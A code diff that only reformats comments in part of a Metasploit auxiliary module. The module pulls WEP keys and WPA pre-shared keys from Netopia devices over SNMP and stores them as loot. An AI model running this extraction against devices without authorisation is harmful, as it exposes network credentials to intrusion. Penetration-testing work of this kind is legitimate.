@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
           wifiversion = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.4.1')
             if wifiversion == "1"
 
-            #Wep enabled
+            # WEP enabled
             elsif wifiversion == ("2"||"3")
               wepkey1 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.1')
               print_good("WEP KEY1: #{wepkey1}")
@@ -64,14 +64,14 @@ class Metasploit3 < Msf::Auxiliary
               print_good("Active Wep key is Key#{actkey}")
               wifiinfo << "Active WEP key is KEY#: #{actkey}" << "\n"
 
-            #WPA enabled
+            # WPA enabled
             elsif wifiversion == "4"
               print_line("Device is configured for WPA ")
               wpapsk = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.5.1')
               print_good("WPA PSK: #{wpapsk}")
               wifiinfo << "WPA PSK: #{wpapsk}" << "\n"
 
-            #WPA Enterprise enabled
+            # WPA Enterprise enabled
             elsif wifiversion == "5"
               print_line("Device is configured for WPA enterprise")
               else
@@ -82,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
          print_line("WIFI is not enabled")
       end
     end
-     #Woot we got loot.
+     # Woot we got loot.
      loot_name     = "netopia_wifi"
      loot_type     = "text/plain"
      loot_filename = "netopia_wifi.txt"
